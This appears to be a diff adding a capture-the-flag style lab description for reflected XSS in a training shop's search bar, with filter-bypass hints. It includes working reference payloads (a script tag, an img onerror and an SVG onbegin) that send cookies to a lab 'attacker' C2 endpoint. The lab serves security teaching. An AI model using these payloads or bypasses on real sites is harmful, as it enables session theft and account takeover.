@@ -1,6 +1,81 @@
 
 # Task 0. Reflected XSS - Basic Search
 
+
+## **Task 0 Description**
+
+### 0. Reflected XSS - Basic Search
+
+The search bar reflects your input directly into the page heading. NexusShop's developers believed that showing the query back to the user was harmless. It is not. Your goal is to prove that anything the server echoes without encoding can become a script execution point.
+
+This is the classic entry point that compromised thousands of real applications. Master the logic here every harder mission builds on it.
+
+#### Stage URLs
+
+| Stage | URL | What Changes |
+| :--- | :--- | :--- |
+| 1 | `/search?q=TESTINPUT` | No filter |
+| 2 | `/search/filtered?q=TESTINPUT` | `<script>` tags blocked |
+| 3 | `/search/advanced?q=TESTINPUT&min_price=&max_price=` | Common event handlers blocked |
+
+#### Mission Objectives
+1. Insert `TESTINPUT123` and find it in the page heading.
+2. Confirm the browser renders it as HTML, not escaped text.
+3. Achieve JavaScript execution with a harmless proof.
+4. Send cookie or exfil data to the C2 dashboard.
+5. Submit your stage token to `/search/api/track`.
+
+#### Hints
+* **Stage 1:** The simplest approach works here. What tag causes a browser to run code?
+* **Stage 2:** `<script>` is gone. Which HTML element fires an event when something fails to load?
+* **Stage 3:** `onerror`, `onload`, and common handlers are blocked. The browser supports many more. Think about SVG animation events.
+* The reflected heading appears before the hidden token use `DELAY_TOKEN`.
+
+#### What Real Attackers Do Here
+A reflected XSS in a search bar becomes a phishing weapon. The attacker crafts a link like:
+
+```text
+web0x0c.hbtn/search?q=<PAYLOAD>
+```
+
+…and sends it to victims. The victim sees a legitimate domain in the URL. The payload executes silently. Cookies, tokens, and keystrokes are sent to the attacker's C2.
+
+#### Verification Checklist
+- [ ] DevTools → Network shows `/attacker/api/exfil`
+- [ ] DevTools → Network shows `/search/api/track`
+- [ ] C2 dashboard at `/attacker` shows cookie/data evidence
+- [ ] Stage 3 tracking response contains the flag
+
+#### Stage Reference Payloads
+
+**Stage 1 - Direct script injection** `/search?q=...`
+```html
+<script>setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie||"no-readable-cookie",level:1,stage:1})});fetch("/search/api/track?t="+t)},500)</script>
+```
+* **What this does:** Uses a `<script>` tag (allowed in Stage 1), waits 500 ms for `tracking-id` to exist, exfils cookies to C2, then submits the token.
+
+**Stage 2 - `<img>` onerror bypass** `/search/filtered?q=...`
+```html
+<img src=x onerror='setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie||"no-readable-cookie",level:1,stage:2})});fetch("/search/api/track?t="+t)},500)'>
+```
+* **What this does:** `src=x` always fails. The browser fires `onerror`. No `<script>` tag required.
+
+**Stage 3 - SVG animation event bypass** `/search/advanced?q=...`
+```html
+<svg><animate attributeName=x dur=1s onbegin='setTimeout(function(){var t=document.getElementById("tracking-id").innerText;fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie||"no-readable-cookie",level:1,stage:3})});fetch("/search/api/track?t="+t).then(r=>r.json()).then(d=>console.log(d))},500)'></animate></svg>
+```
+* **What this does:** Uses SVG's `onbegin` animation event a less commonly blocked handler. Demonstrates that filtering a short list of event names is insufficient.
+
+**Repo:**
+* GitHub repository: `dlh-cyber_security`
+* Directory: `web_application_security/websec_0x0C`
+* File: `0-flag.txt`
+
+
+
+## **Solution**
+
+
 - Start sandbox `cyber_websec_0x0c`.
 - Start openvpn.
 - Put IP address of the sandbox in `/etc/hosts` file.
